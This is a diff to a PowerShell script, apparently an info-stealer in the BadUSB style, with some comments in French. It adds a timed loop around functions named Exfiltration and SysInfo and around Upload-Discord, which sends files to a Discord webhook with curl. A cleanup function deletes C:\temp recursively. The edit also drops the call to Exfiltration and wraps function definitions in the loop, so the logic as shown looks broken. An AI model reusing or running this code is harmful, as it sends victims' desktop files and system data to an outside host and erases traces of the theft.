@@ -1,3 +1,14 @@
+# Définir la durée du délai en secondes
+$delaiEnSecondes = 120  # 2 minutes
+
+# Définir le moment où le délai expire
+$finDélai = (Get-Date).AddSeconds($delaiEnSecondes)
+
+# Fonction pour vérifier si le délai est écoulé
+function Délai-Écoulé {
+    return (Get-Date) -ge $finDélai
+}
+
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -20,6 +31,9 @@ function Upload-Discord {
         curl.exe -F "file1=@$file" $DiscordUrl
     }
 }
+
+# Boucle principale
+do {
 
 function Exfiltration {
     # Get desktop path
@@ -112,15 +126,9 @@ function SysInfo {
 function Del-Nirsoft-File {
   cd C:\
   rmdir -R \temp
-  exit
 }
+# Attendre une seconde avant de vérifier à nouveau
+    Start-Sleep -Seconds 1
+} until (Délai-Écoulé)
 
-try {
-    # Call Exfiltration function
-    Exfiltration
-}
-finally {
-    # Cela sera exécuté même en cas d'erreur
-    # Attendre que la fenêtre soit fermée avant de quitter
-    $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
-}
+exit
